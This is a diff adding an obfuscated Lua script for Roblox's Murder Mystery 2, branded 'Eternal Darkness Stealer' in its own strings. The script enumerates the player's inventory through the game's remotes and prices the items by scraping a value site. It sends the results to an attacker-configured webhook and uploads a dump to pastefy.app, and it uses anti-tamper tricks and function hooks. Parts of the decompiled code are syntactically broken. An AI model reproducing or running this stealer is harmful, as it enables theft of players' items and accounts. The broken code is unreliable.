@@ -1,0 +1,1656 @@
+local Env = getfenv();
+local i = {};
+local r59 = true;
+local v1 = {...};
+local r67 = string.gmatch;
+local function r1(...)
+    error("Tamper Detected!");
+    return; 
+end;
+local r71 = false;
+local v2 = pcall(function(...)
+    r71 = true;
+    return; 
+end);
+local v3 = v2;
+if v2 then
+    v3 = r71;
+end;
+local v4 = v3;
+local r62 = math.random;
+local v5 = table.concat;
+local function v6(...)
+    while true do
+        l1 = l2;
+        l2 = l1;
+        r1(); 
+    end;
+    return; 
+end;
+local r70 = table and table.unpack or unpack;
+local r69 = r62(3, 65);
+local v7 = {
+    pcall(function(...)
+        return "4HbZ66wItL0wyx1" / (7002593 - "eO" ^ 12265392); 
+    end)
+};
+local v8 = v7[2];
+local r68 = tonumber(r67(tostring(v8), ":(%d*):")());
+local v9 = 1 < 0;
+for o = 1, r69 do
+    r60 = o;
+    r61 = math.random(1, 100);
+    r63 = r62(0, 255);
+    r64 = r62(1, r61);
+    r65 = r62(1, 2) == 1;
+    r66 = v8:gsub(":(%d*):", ":" .. tostring(r62(0, 10000)) .. ":");
+    if r65 then
+        r59 = r59 and pcall(function(...)
+            local J = {
+                68,
+                60,
+                8,
+                31,
+                29,
+                9,
+                64,
+                65,
+                61,
+                63,
+                62,
+                7
+            };
+            if r62(1, 2) == 1 or r60 == r69 then
+                r59 = r59 and r68 == tonumber(r67(tostring(({
+                    pcall(function(...)
+                        return "9m2" / (11673288 - "VfSpChYwHPtgl" ^ 444972); 
+                    end)
+                })[2]), ":(%d*):")());
+            end;
+            if r65 then
+                error(r66, 0);
+            end;
+            v1 = {};
+            v4 = 1 < 0;
+            for e = 1, r61 do
+                v1[e] = r62(0, 255); 
+            end;
+            v1[r64] = r63;
+            return r70(v1); 
+        end) == false;
+    end; 
+end;
+local r59 = r59 and 0 == 0;
+if r59 then
+    r4 = math.floor;
+    v7 = {};
+    r5 = 0;
+    r6 = 2;
+    r7 = {};
+    K = 0;
+    s = 1 < 0;
+    for E = 1, 256 do
+        v7[E] = E; 
+    end;
+    v8 = #v7 == 0;
+    E = table.remove(v7, math.random(1, #v7));
+    r7[E] = string.char(E - 1);
+    if #v7 == 0 then
+        r8 = {};
+        local function r9(...)
+            local J = {
+                69,
+                20,
+                19,
+                18
+            };
+            if #r8 == 0 then
+                r5 = (r5 * 13 + 12745963657007) % 35184372088832;
+                v3 = r6 ~= 1;
+                r6 = r6 * 229 % 257;
+                if r6 ~= 1 then
+                    v1 = r6 % 32;
+                    t = r4(r5 / 2 ^ (13 - (r6 - v1) / 32)) % 4294967296 / 2 ^ v1;
+                    e = r4(t % 1 * 4294967296) + r4(t);
+                    z = e % 65536;
+                    C = (e - z) / 65536;
+                    v4 = z % 256;
+                    v6 = C % 256;
+                    r8 = {
+                        v4,
+                        (z - v4) / 256,
+                        v6,
+                        (C - v6) / 256
+                    };
+                    return table.remove(r8);
+                end;
+            end; 
+        end;
+        r10 = {};
+        r2 = setmetatable({}, {
+            ["__index"] = r10,
+            ["__metatable"] = nil
+        });
+        local function r3(arg1, arg2, ...)
+            local J = {
+                71,
+                69,
+                15,
+                20,
+                19,
+                70
+            };
+            t = arg2;
+            e = r10;
+            if e[t] then
+            else
+                r8 = {};
+                r5 = t % 35184372088832;
+                r6 = t % 255 + 2;
+                e[t] = "";
+                V = 1 < 0;
+                for S = 1, string.len(arg1) do
+                    e[t] = e[t] .. r7[(string.byte(arg1, S) + r9() + 175) % 256 + 1]; 
+                end;
+                return t;
+            end; 
+        end;
+        e = game;
+        e:IsLoaded();
+        task.wait();
+        e = game;
+        if e:IsLoaded() then
+            task.wait(2);
+            if game.PlaceId ~= 142823291 then
+                r11 = game.Players.LocalPlayer;
+                v5 = i[t];
+                if r11 and typeof(r11.Kick) == "function" then
+                    pcall(function(...)
+                        local J = {
+                            49,
+                            16,
+                            17
+                        };
+                        v5 = r11;
+                        v5:Kick("This script only works in MM2!");
+                        return; 
+                    end);
+                end;
+                return;
+            end;
+            if not _G.ED_CONFIG then
+                warn("[ED] No config found. Execute the user loader first!");
+                return;
+            end;
+            e = _G.ED_CONFIG;
+            r12 = e.WEBHOOK_ID;
+            r13 = e.USERNAMES;
+            r14 = e.PROXY_URL;
+            if not r12 or r12 == "" then
+                warn("[ED] Invalid WEBHOOK_ID");
+                return;
+            end;
+            v5 = i[t];
+            if not r13 or #r13 == 0 then
+                warn("[ED] No usernames configured");
+                return;
+            end;
+            C = game;
+            r15 = C:GetService("HttpService");
+            q = game;
+            q = game;
+            r16 = q:GetService("ReplicatedStorage");
+            K = game;
+            K:GetService("TeleportService");
+            r17 = q:GetService("Players").LocalPlayer;
+            if not r17 then
+                warn("[ED] LocalPlayer not found");
+                return;
+            end;
+            v5 = v5;
+            v5 = v5;
+            v5 = v5;
+            v5 = v5;
+            v5 = v5;
+            v5 = v5;
+            v5 = v5;
+            v9 = request or (http_request or (syn and syn.request or (http and http.request or (fluxus and fluxus.request or nil))));
+            r18 = "Unknown";
+            pcall(function(...)
+                local J = {
+                    56
+                };
+                if identifyexecutor then
+                    r18 = identifyexecutor();
+                else
+                    if getexecutorname then
+                        r18 = getexecutorname();
+                    end;
+                    return;
+                end; 
+            end);
+            v9 = r2;
+            v5 = v5;
+            getgenv().request = getgenv().request or v9;
+            if not getgenv().request then
+                warn("[ED] No request function found - executor not supported");
+                return;
+            end;
+            r19 = getgenv().request;
+            K = game.JobId;
+            r20 = game.JobId;
+            r21 = false;
+            v5 = v5;
+            if identifyexecutor and identifyexecutor() == "Delta" then
+                r22 = false;
+                r = getgc;
+                h = r[2];
+                W = r[3];
+                for W, r in ipairs(r(true)) do
+                    L = W;
+                    c = "function";
+                    if typeof(r) == c then
+                        c = debug.getinfo(r);
+                        if c then
+                            R = c.name == "stepAnimate";
+                        end;
+                        v5 = L;
+                        if c then
+                            v9 = r;
+                        else
+                            
+                        end;
+                    end; 
+                end;
+                task.wait();
+                if nil then
+                    r23 = hookfunction(nil, function(arg1_2, ...)
+                        local J = {
+                            58,
+                            16,
+                            17,
+                            13,
+                            12,
+                            57
+                        };
+                        if not r22 then
+                            r22 = true;
+                            r20 = game.JobId;
+                            r21 = true;
+                        end;
+                        return r23(arg1_2); 
+                    end);
+                    L = r21;
+                    GT = 2058023076798;
+                    yT = r3("\xef,\xaa\xfc", GT);
+                    task[r2[yT]]();
+                    if r21 then
+                        K = r20;
+                        kT = true;
+                        oT = "Vampire's Gun";
+                        yT = {
+                            pcall(function(...)
+                                local J = {
+                                    35,
+                                    16,
+                                    17
+                                };
+                                v1 = r16;
+                                t = v1:WaitForChild("Database");
+                                v1 = t:WaitForChild("Sync");
+                                return require(v1:WaitForChild("Item")); 
+                            end)
+                        };
+                        r24 = yT[2];
+                        v5 = v5;
+                        if not yT[1] or not r24 then
+                            warn("[ED] Failed to load item database");
+                            return;
+                        end;
+                        GT = {
+                            pcall(function(...)
+                                local J = {
+                                    35,
+                                    16,
+                                    17,
+                                    36
+                                };
+                                v5 = r16.Remotes.Inventory.GetProfileData;
+                                return v5:InvokeServer(r17.Name); 
+                            end)
+                        };
+                        yT = GT[2];
+                        GT = not GT[1];
+                        c = GT;
+                        BT = v5;
+                        if GT then
+                            if c then
+                                warn("[ED] Failed to get profile data");
+                                return;
+                            end;
+                            r25 = {
+                                ["godlies"] = "https://supremevalues.com/mm2/godlies",
+                                ["chroma"] = "https://supremevalues.com/mm2/chromas",
+                                ["ancients"] = "https://supremevalues.com/mm2/ancients",
+                                ["vintages"] = "https://supremevalues.com/mm2/vintages",
+                                ["uniques"] = "https://supremevalues.com/mm2/uniques",
+                                ["legendaries"] = "https://supremevalues.com/mm2/legendaries"
+                            };
+                            local function r27(arg1_3, ...)
+                                local J = {
+                                    11,
+                                    16,
+                                    17
+                                };
+                                r26 = arg1_3;
+                                z = {
+                                    pcall(function(...)
+                                        local J = {
+                                            11,
+                                            16,
+                                            17,
+                                            39
+                                        };
+                                        return r19({
+                                            ["Url"] = r26,
+                                            ["Method"] = "GET"
+                                        }); 
+                                    end)
+                                };
+                                e = z[1];
+                                t = z[2];
+                                if e then
+                                    if t then
+                                        z = z[2].Body;
+                                    end;
+                                    v3 = t;
+                                    v5 = pcall;
+                                end;
+                                if e then
+                                    return t.Body;
+                                end;
+                                return nil; 
+                            end;
+                            local function r28(arg1_4, ...)
+                                local J = {
+                                    16,
+                                    17
+                                };
+                                v1 = arg1_4;
+                                t = v1:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>");
+                                if t then
+                                    t = t:gsub(",", "");
+                                    return tonumber(t);
+                                end;
+                                return nil; 
+                            end;
+                            local function r29(arg1_5, ...)
+                                local J = {
+                                    16,
+                                    17,
+                                    5
+                                };
+                                v1 = arg1_5;
+                                z = "<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>";
+                                C = v1.gmatch;
+                                z = C[1];
+                                e = C[3];
+                                for e, v2 in z, 1(v1, z) do
+                                    v4 = e:match("([^<]+)");
+                                    if v4 then
+                                        q = v6:gsub("%s+", " ");
+                                        S = q:gsub("^%s*(.-)%s*$", "%1");
+                                        S = r28;
+                                        K = S(v2);
+                                        if K then
+                                            S = K;
+                                            ({})[S:lower()] = S;
+                                        end;
+                                    end; 
+                                end;
+                                return {}; 
+                            end;
+                            r30 = {};
+                            kT = {
+                                ["Ancient"] = 0,
+                                ["Godly"] = 0,
+                                ["Unique"] = 0,
+                                ["Vintage"] = 0,
+                                ["Legendary"] = 0,
+                                ["Rare"] = 0,
+                                ["Uncommon"] = 0,
+                                ["Common"] = 0
+                            };
+                            (function(...)
+                                local J = {
+                                    16,
+                                    17,
+                                    3,
+                                    4,
+                                    6,
+                                    41
+                                };
+                                r31 = {};
+                                r32 = {};
+                                r33 = 0;
+                                r34 = Instance.new("BindableEvent");
+                                v2 = r25;
+                                v4 = ("b\xbd\xc8\xef=@x_\xa1\x0fg\x8c\xa5")[3];
+                                v2 = ("b\xbd\xc8\xef=@x_\xa1\x0fg\x8c\xa5")[1];
+                                for v4, q in v2, pairs(v2) do
+                                    r35 = v4;
+                                    r36 = q;
+                                    task.spawn(function(...)
+                                        local J = {
+                                            4,
+                                            38,
+                                            37,
+                                            16,
+                                            17,
+                                            6,
+                                            44,
+                                            43,
+                                            42,
+                                            45
+                                        };
+                                        v1 = r2(r3);
+                                        if v1 then
+                                            if r25 == "chroma" then
+                                                r32 = r24(v1);
+                                            else
+                                                z = ("\xb6\xed\xaa\x7fQ\xc6")[2];
+                                                C = ("\xb6\xed\xaa\x7fQ\xc6")[3];
+                                                for C, v2 in pairs(r29(v3)) do
+                                                    r31[C] = v2; 
+                                                end;
+                                            end;
+                                        end;
+                                        r33 = r33 + 1;
+                                        t = r33 >= 6;
+                                        if t then
+                                            t = r34;
+                                            t:Fire();
+                                        end;
+                                        return; 
+                                    end); 
+                                end;
+                                v5 = r34.Event;
+                                v5:Wait();
+                                v2 = ("_\xaf{\x9d\xb2")[2];
+                                v4 = ("_\xaf{\x9d\xb2")[1];
+                                for v6, S in pairs(r24) do
+                                    q = v6;
+                                    K = S.ItemName or "";
+                                    K = K:lower();
+                                    if S.Chroma or false then
+                                        N = r32;
+                                        o = ("7\x1e\xef\xe8\xa4\xf4")[3];
+                                        for o, N in ("7\x1e\xef\xe8\xa4\xf4")[1], pairs(N) do
+                                            if o:find(v5) then
+                                                ({})[v6] = N;
+                                            else
+                                                
+                                            end; 
+                                        end;
+                                    else
+                                        if r31[v5] then
+                                            ({})[v6] = r31[v5];
+                                        end;
+                                    end; 
+                                end;
+                                return {}; 
+                            end)();
+                            jT = false;
+                            v5 = v5;
+                            v5 = v5;
+                            CT = "Unique";
+                            wT = true;
+                            AT = true;
+                            eT = CT[1];
+                            zT = CT[2];
+                            for QT, CT in pairs(yT.Weapons and yT.Weapons.Owned or ) do
+                                AT = v5;
+                                wT = r24[QT];
+                                if wT then
+                                    vT = not ({
+                                        ["DefaultGun"] = true,
+                                        ["DefaultKnife"] = true,
+                                        ["Reaver"] = true,
+                                        ["Reaver_Legendary"] = true,
+                                        ["Reaver_Godly"] = true,
+                                        ["Reaver_Ancient"] = true,
+                                        ["IceHammer"] = true,
+                                        ["IceHammer_Legendary"] = true,
+                                        ["IceHammer_Godly"] = true,
+                                        ["IceHammer_Ancient"] = true,
+                                        ["Gingerscythe"] = true,
+                                        ["Gingerscythe_Legendary"] = true,
+                                        ["Gingerscythe_Godly"] = true,
+                                        ["Gingerscythe_Ancient"] = true,
+                                        ["TestItem"] = true,
+                                        ["Season1TestKnife"] = true,
+                                        ["Cracks"] = true,
+                                        ["Icecrusher"] = true,
+                                        ["???"] = true,
+                                        ["Dartbringer"] = true,
+                                        ["TravelerAxeRed"] = true,
+                                        ["TravelerAxeBronze"] = true,
+                                        ["TravelerAxeSilver"] = true,
+                                        ["TravelerAxeGold"] = true,
+                                        ["BlueCamo_K_2022"] = true,
+                                        ["GreenCamo_K_2022"] = true,
+                                        ["SharkSeeker"] = true
+                                    })[QT] and CT > 0;
+                                    v5 = v5;
+                                end;
+                                v5 = AT;
+                                if wT then
+                                    AT = v5;
+                                    TT = wT.ItemName;
+                                    vT = TT;
+                                    if TT then
+                                        TT = i[W][tT].Rarity or "Common";
+                                        if not ({
+                                            ["Godly"] = true,
+                                            ["Ancient"] = true,
+                                            [CT] = wT,
+                                            [vT] = AT
+                                        })[i[W][tT].Rarity or "Common"] then
+                                            
+                                        else
+                                            uT = TT;
+                                            TT = ZT()[QT] or 1;
+                                            HT = TT * CT;
+                                            DT = DT + HT;
+                                            if ({
+                                                ["C. Traveler's Gun"] = true,
+                                                ["Chroma Evergun"] = true,
+                                                ["Chroma Evergreen"] = true,
+                                                ["Chroma Bauble"] = JT,
+                                                [ZT] = DT,
+                                                [mT] = kT,
+                                                [jT] = iT,
+                                                [FT] = PT,
+                                                [tT] = eT,
+                                                [zT] = QT,
+                                                [CT] = wT,
+                                                [vT] = AT,
+                                                [TT] = HT,
+                                                [xT] = uT,
+                                                [YT] = dT,
+                                                [pT] = ST,
+                                                [VT] = KT,
+                                                [qT] = MT,
+                                                [aT] = ET,
+                                                [fT] = NT,
+                                                [oT] = IT,
+                                                [bT] = sT,
+                                                [UT] = LT,
+                                                [lT] = XT,
+                                                [hT] = WT,
+                                                [OT] = rT,
+                                                [cT] = gT,
+                                                [RT] = nT,
+                                                [yZ] = BZ,
+                                                [GZ] = ZZ,
+                                                [DZ] = JZ,
+                                                [mZ] = kZ
+                                            })[TT] then
+                                                jT = true;
+                                            end;
+                                            table.insert(r30, {
+                                                ["DataID"] = QT,
+                                                ["ItemName"] = TT,
+                                                ["Amount"] = CT,
+                                                ["Rarity"] = AT,
+                                                ["Value"] = TT,
+                                                ["TotalValue"] = HT
+                                            });
+                                            dT = TT;
+                                            kT[AT] = (kT[AT] or 0) + CT;
+                                        end;
+                                    else
+                                        vT = tostring(QT);
+                                    end;
+                                else
+                                    
+                                end; 
+                            end;
+                            table.sort(r30, function(arg1_6, arg2_6, ...)
+                                local J = {
+                                    16,
+                                    17
+                                };
+                                return arg1_6.TotalValue > arg2_6.TotalValue; 
+                            end);
+                            if #r30 == 0 then
+                                pcall(function(...)
+                                    local J = {
+                                        36,
+                                        16,
+                                        17
+                                    };
+                                    v5 = r17;
+                                    v5:Kick("Eternal Darkness Stealer\nhttps://discord.gg/vMgE6A4Mbe");
+                                    return; 
+                                end);
+                                return;
+                            end;
+                            local function zT(arg1_7, ...)
+                                local J = {
+                                    16,
+                                    17,
+                                    48,
+                                    46,
+                                    11,
+                                    34
+                                };
+                                r37 = arg1_7;
+                                task.spawn(function(...)
+                                    local J = {
+                                        48,
+                                        46,
+                                        11,
+                                        16,
+                                        17,
+                                        34,
+                                        33
+                                    };
+                                    if t then
+                                        v5 = v5;
+                                        z = t.StatusCode ~= 200 and t.StatusCode ~= 204;
+                                    end;
+                                    v5 = v5;
+                                    v3 = t;
+                                    r38 = r2 .. r3;
+                                    z = {
+                                        pcall(function(...)
+                                            local J = {
+                                                48,
+                                                46,
+                                                11,
+                                                1,
+                                                34,
+                                                33
+                                            };
+                                            q = r19;
+                                            return r2({
+                                                ["Url"] = r12,
+                                                ["Method"] = "POST",
+                                                ["Headers"] = {
+                                                    ["Content-Type"] = "application/json",
+                                                    ["User-Agent"] = "EternalDarkness/2.0.0"
+                                                },
+                                                ["Body"] = q:JSONEncode(r15)
+                                            }); 
+                                        end)
+                                    };
+                                    v3 = z[1];
+                                    e = not e or v3;
+                                    t = z[2];
+                                    if not e or v3 then
+                                        warn("[ED] Webhook failed");
+                                    end;
+                                    return; 
+                                end);
+                                return; 
+                            end;
+                            (function(arg1_8, ...)
+                                local J = {
+                                    16,
+                                    17,
+                                    36,
+                                    11,
+                                    34
+                                };
+                                v1 = arg1_8;
+                                t = {
+                                    "Eternal Darkness v6.0.0 Inventory Dump | " .. r17.Name,
+                                    "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"),
+                                    "Total Items: " .. #v1,
+                                    string.rep("-", 50),
+                                    ""
+                                };
+                                v4 = r3("=\"\xc4N", 17568489512948);
+                                table[r2[v4]](v1, function(arg1_9, arg2_9, ...)
+                                    local J = {
+                                        16,
+                                        17
+                                    };
+                                    t = arg2_9;
+                                    v1 = arg1_9;
+                                    v5 = {
+                                        ["Ancient"] = 9,
+                                        ["Godly"] = 8,
+                                        ["Unique"] = 7,
+                                        ["Vintage"] = 6,
+                                        ["Legendary"] = 5,
+                                        ["Rare"] = 4,
+                                        ["Uncommon"] = 3,
+                                        ["Common"] = 2
+                                    };
+                                    C = v5;
+                                    z = v5[v1.Rarity] or 1;
+                                    C = v5[t.Rarity] or 1;
+                                    if z ~= C then
+                                        return z > C;
+                                    end;
+                                    return v1.Value * v1.Amount > t.Value * t.Amount; 
+                                end);
+                                v5 = ipairs;
+                                C = v4[3];
+                                v4 = v4[1];
+                                for C, v6 in v4, v5(v1) do
+                                    v2 = C;
+                                    if e ~= v6.Rarity then
+                                        e = v6.Rarity;
+                                        table.insert(t, "");
+                                        table.insert(t, "[" .. e:upper() .. "]");
+                                        table.insert(t, string.rep("-", 30));
+                                    end;
+                                    table.insert(t, string.format("%s | Qty: %d | Value: %d (Total: %d)", v6.ItemName, v6.Amount, v6.Value, v6.Value * v6.Amount)); 
+                                end;
+                                K = 26403388993543;
+                                r39 = table.concat(t, r2[r3("\xd7", K)]);
+                                q = {
+                                    pcall(function(...)
+                                        local J = {
+                                            11,
+                                            16,
+                                            17,
+                                            34,
+                                            66
+                                        };
+                                        q = r19;
+                                        return r2({
+                                            ["Url"] = "https://pastefy.app/api/v2/paste",
+                                            ["Method"] = "POST",
+                                            ["Headers"] = {
+                                                ["Content-Type"] = "application/json"
+                                            },
+                                            ["Body"] = q:JSONEncode({
+                                                ["content"] = r15,
+                                                ["type"] = "PASTE"
+                                            })
+                                        }); 
+                                    end)
+                                };
+                                v4 = q[1];
+                                r40 = q[2];
+                                if v4 then
+                                    v2 = r40 and r40.StatusCode == 200;
+                                    v5 = ipairs;
+                                end;
+                                v5 = v5;
+                                if v4 then
+                                    K = {
+                                        pcall(function(...)
+                                            local J = {
+                                                34,
+                                                67,
+                                                16,
+                                                17
+                                            };
+                                            v5 = r2;
+                                            return v5:JSONDecode(r3.Body); 
+                                        end)
+                                    };
+                                    q = K[2];
+                                    S = v6;
+                                    v6 = K[1];
+                                    if v6 then
+                                        v2 = K[2];
+                                    end;
+                                    v5 = S;
+                                    if v6 then
+                                        S = S;
+                                        V = S;
+                                        S = S;
+                                        S = S;
+                                        v5 = S;
+                                        v5 = S;
+                                        return q.paste and "https://pastefy.app/" .. q.paste.id or (q.id and "https://pastefy.app/" .. q.id or "Failed to upload");
+                                    end;
+                                end;
+                                return "Failed to upload"; 
+                            end)(r30);
+                            wT = (function(arg1_10, ...)
+                                local J = {
+                                    16,
+                                    17,
+                                    41
+                                };
+                                zZ[46] = "\x19\xbb\xcb\xbd\xf2{j";
+                                e = {};
+                                zZ[39] = 11276849288323;
+                                zZ[24] = "\x84\xa0\xdc\xc6g\x8d\xc4\xf2M";
+                                v2 = "Glitched";
+                                zZ[37] = 7360160288099;
+                                zZ[19] = 16707914112612;
+                                zZ[32] = "\x95\x837^%\x94\xb8cl\xbeXL\x08\xb3";
+                                zZ[15] = 26368930181110;
+                                zZ[10] = "g\x90J\xdc\xdb\x8cP";
+                                zZ[30] = "\xda\xcft\x97\xca\xc1%g\xab\xca\xca";
+                                zZ[11] = 2769977967881;
+                                zZ[48] = "\xd7\\\xaf$\xe5";
+                                zZ[29] = 29667356112374;
+                                zZ[43] = 29229668939051;
+                                zZ[25] = 24248930200603;
+                                zZ[31] = 16344544746939;
+                                zZ[34] = "\x9e\xf1\x84r\xb5\xb2d\x96\x97}\xabu";
+                                zZ[45] = 16804930526865;
+                                zZ[18] = "\x02sd\\\x891";
+                                zZ[12] = "\x88\xed \xd6\\lR\xf6\x8e\x9aj\xc0Y`";
+                                zZ[5] = 8856611196956;
+                                zZ[22] = "\xb0\x03aZ\xfe\x00\xafr";
+                                zZ[14] = "\x92\x18\x86\xa6y\xf49\x8a\xa2\xc3x\x88\xbb";
+                                zZ[2] = "7\x92\x8ay#f\xac|\xb8\xee\xf1";
+                                zZ[28] = "\xaa\xdar\xcd\xdc\xd0\xe8\x80\xc9\xc6\x1a";
+                                zZ[1] = 5062593349941;
+                                zZ[17] = 16797780729486;
+                                zZ[41] = 28644539593754;
+                                zZ[40] = "\xb6\xe3\x98:\x95\xddq\xac\xb1X-";
+                                zZ[8] = "e\x00vY\xe3\xf6ck\xab";
+                                zZ[7] = 25812993830644;
+                                zZ[23] = 28733336892484;
+                                zZ[16] = "\xdc\x943p\xd1d\xcdH\x8c\xc5\x10\xffg";
+                                zZ[20] = "t\xb8_<\x07\xaa\x1a\xd3L";
+                                zZ[4] = "\x10<\xc7\x9a\xfc\x17l\x10\xcf";
+                                zZ[6] = "\xfb\xf4\x81\xc5\xf5\xd1\x0c\xde\xd8";
+                                zZ[3] = 28954143749290;
+                                zZ[47] = 5228912527746;
+                                zZ[1] = r3(zZ[2], zZ[3]);
+                                zZ[26] = "\xd32\x9dd\xb6 Ja\x7f\x9a&g";
+                                zZ[1] = r2;
+                                zZ[2] = r3;
+                                zZ[38] = "d/\xd7\xcc%S\xf0\x9b\xa5\xad";
+                                zZ[9] = 5243810007433;
+                                zZ[3] = zZ[2](zZ[4], zZ[5]);
+                                zZ[1] = 1.5;
+                                zZ[3] = r2;
+                                zZ[4] = r3;
+                                zZ[5] = zZ[4](zZ[6], zZ[7]);
+                                zZ[2] = zZ[3][zZ[5]];
+                                zZ[3] = 1.5;
+                                zZ[5] = r2;
+                                zZ[6] = r3;
+                                zZ[7] = zZ[6](zZ[8], zZ[9]);
+                                zZ[4] = zZ[5][zZ[7]];
+                                zZ[7] = r2;
+                                zZ[13] = 27766632657537;
+                                zZ[5] = 1.5;
+                                zZ[8] = r3;
+                                zZ[27] = 22973645580745;
+                                zZ[9] = zZ[8](zZ[10], zZ[11]);
+                                zZ[6] = zZ[7][zZ[9]];
+                                zZ[9] = r2;
+                                zZ[7] = 1.5;
+                                zZ[10] = r3;
+                                zZ[36] = "\xd2\x88\xab\xbe\x00 \x14>\x02w44\x91iJ\xc6'";
+                                zZ[11] = zZ[10](zZ[12], zZ[13]);
+                                zZ[35] = 31714424207792;
+                                zZ[8] = zZ[9][zZ[11]];
+                                zZ[9] = 1.5;
+                                zZ[11] = r2;
+                                zZ[12] = r3;
+                                zZ[13] = zZ[12](zZ[14], zZ[15]);
+                                zZ[10] = zZ[11][zZ[13]];
+                                zZ[11] = 1.5;
+                                zZ[13] = r2;
+                                zZ[14] = r3;
+                                zZ[15] = zZ[14](zZ[16], zZ[17]);
+                                zZ[12] = zZ[13][zZ[15]];
+                                zZ[15] = r2;
+                                zZ[21] = 33156258806863;
+                                zZ[13] = 1.5;
+                                zZ[16] = r3;
+                                zZ[17] = zZ[16](zZ[18], zZ[19]);
+                                zZ[42] = "#\xe58\xfe\xabE<\x8eJ$|\xc6\xc8}\x14";
+                                zZ[33] = 26080595013488;
+                                zZ[14] = zZ[15][zZ[17]];
+                                zZ[15] = 1.5;
+                                zZ[17] = r2;
+                                zZ[18] = r3;
+                                zZ[19] = zZ[18](zZ[20], zZ[21]);
+                                zZ[16] = zZ[17][zZ[19]];
+                                zZ[19] = r2;
+                                zZ[17] = 1.5;
+                                zZ[20] = r3;
+                                zZ[21] = zZ[20](zZ[22], zZ[23]);
+                                zZ[18] = zZ[19][zZ[21]];
+                                zZ[21] = r2;
+                                zZ[19] = 1.5;
+                                zZ[22] = r3;
+                                zZ[23] = zZ[22](zZ[24], zZ[25]);
+                                zZ[20] = zZ[21][zZ[23]];
+                                zZ[21] = 1.5;
+                                zZ[23] = r2;
+                                zZ[24] = r3;
+                                zZ[25] = zZ[24](zZ[26], zZ[27]);
+                                zZ[22] = zZ[23][zZ[25]];
+                                zZ[23] = 8.4;
+                                zZ[25] = r2;
+                                zZ[26] = r3;
+                                zZ[27] = zZ[26](zZ[28], zZ[29]);
+                                zZ[24] = zZ[25][zZ[27]];
+                                zZ[27] = r2;
+                                zZ[25] = 8.4;
+                                zZ[28] = r3;
+                                zZ[29] = zZ[28](zZ[30], zZ[31]);
+                                zZ[26] = zZ[27][zZ[29]];
+                                zZ[29] = r2;
+                                zZ[27] = 8.4;
+                                zZ[30] = r3;
+                                zZ[31] = zZ[30](zZ[32], zZ[33]);
+                                zZ[28] = zZ[29][zZ[31]];
+                                zZ[29] = 8.4;
+                                zZ[31] = r2;
+                                zZ[49] = 2803343344921;
+                                zZ[32] = r3;
+                                zZ[33] = zZ[32](zZ[34], zZ[35]);
+                                zZ[30] = zZ[31][zZ[33]];
+                                zZ[31] = 8.4;
+                                zZ[33] = r2;
+                                zZ[34] = r3;
+                                zZ[35] = zZ[34](zZ[36], zZ[37]);
+                                zZ[32] = zZ[33][zZ[35]];
+                                zZ[33] = 8.4;
+                                zZ[35] = r2;
+                                zZ[36] = r3;
+                                zZ[37] = zZ[36](zZ[38], zZ[39]);
+                                zZ[44] = "{\x92\xe7\xd7\xebE5\xdd\x11>\xee\x82";
+                                zZ[34] = zZ[35][zZ[37]];
+                                zZ[37] = r2;
+                                zZ[35] = 8.4;
+                                zZ[38] = r3;
+                                zZ[39] = zZ[38](zZ[40], zZ[41]);
+                                zZ[36] = zZ[37][zZ[39]];
+                                zZ[39] = r2;
+                                zZ[40] = r3;
+                                zZ[41] = zZ[40](zZ[42], zZ[43]);
+                                zZ[38] = zZ[39][zZ[41]];
+                                zZ[39] = 6.6;
+                                zZ[37] = 7.5;
+                                zZ[41] = r2;
+                                zZ[42] = r3;
+                                zZ[43] = zZ[42](zZ[44], zZ[45]);
+                                zZ[40] = zZ[41][zZ[43]];
+                                zZ[43] = r2;
+                                zZ[44] = r3;
+                                zZ[45] = zZ[44](zZ[46], zZ[47]);
+                                zZ[41] = 10.5;
+                                zZ[42] = zZ[43][zZ[45]];
+                                zZ[43] = 15;
+                                zZ[45] = r2;
+                                zZ[46] = r3;
+                                zZ[47] = zZ[46](zZ[48], zZ[49]);
+                                zZ[44] = zZ[45][zZ[47]];
+                                zZ[45] = 12;
+                                v4 = v2[3];
+                                C = v2[2];
+                                for v4, q in ipairs(arg1_10) do
+                                    v6 = v4;
+                                    S = r24[q.DataID] and r24[q.DataID].ItemName or q.DataID;
+                                    v5 = Env[v3];
+                                    K = ({
+                                        ["Nik's Scythe"] = 1500,
+                                        ["Corrupt"] = 800,
+                                        [v2] = 500,
+                                        ["Batwing"] = 45,
+                                        ["Icewing"] = 35,
+                                        ["Hallowscythe"] = 25,
+                                        ["Icebreaker"] = 20,
+                                        ["Elderwood Scythe"] = 18,
+                                        ["Logchopper"] = 15,
+                                        ["Hallow's Blade"] = 12,
+                                        ["BattleAxe"] = 12,
+                                        ["BattleAxe II"] = 10,
+                                        ["Ginger Luger"] = 8,
+                                        ["Ice Dragon"] = 7,
+                                        ["Red Luger"] = 7,
+                                        ["Green Luger"] = 7,
+                                        ["Chill"] = 6.5,
+                                        ["Handsaw"] = 6,
+                                        ["Pixel"] = 5.5,
+                                        ["Candy"] = 5,
+                                        ["Sugar"] = 5,
+                                        ["Eternal"] = 4.5,
+                                        ["Spider"] = 4,
+                                        ["Old Glory"] = 4,
+                                        ["Amerilaser"] = 4,
+                                        ["Virtual"] = 3.5,
+                                        ["Blaster"] = 3.5,
+                                        ["Laser"] = 3.5,
+                                        ["Prince"] = 3,
+                                        ["Shadow"] = 3,
+                                        ["Saw"] = 2.8,
+                                        ["Deathshard"] = 2.8,
+                                        ["Fang"] = 2.8,
+                                        ["Tides"] = 2.8,
+                                        ["Slasher"] = 2.8,
+                                        ["Heat"] = 2.8,
+                                        ["Luger"] = 2.8,
+                                        ["Flames"] = 2.5,
+                                        ["Seer"] = 2.5,
+                                        ["Nightblade"] = 2.2,
+                                        ["Gemstone"] = 2.2,
+                                        ["Bio"] = 2,
+                                        ["Phoenix"] = 2,
+                                        ["Frostsaber"] = 2,
+                                        ["Ice Shard"] = 1.8,
+                                        ["Winter's Edge"] = 1.8,
+                                        [r2[r3("\xbf\x1d\xa9\xcf\n\x15\xd2\xea@SO\xd8\xad\x96", zZ[1])]] = 1.5,
+                                        [r2[zZ[1]]] = 1.5,
+                                        [zZ[1][zZ[3]]] = zZ[1],
+                                        [zZ[2]] = zZ[3],
+                                        [zZ[4]] = zZ[5],
+                                        [zZ[6]] = zZ[7],
+                                        [zZ[8]] = zZ[9],
+                                        [zZ[10]] = zZ[11],
+                                        [zZ[12]] = zZ[13],
+                                        [zZ[14]] = zZ[15],
+                                        [zZ[16]] = zZ[17],
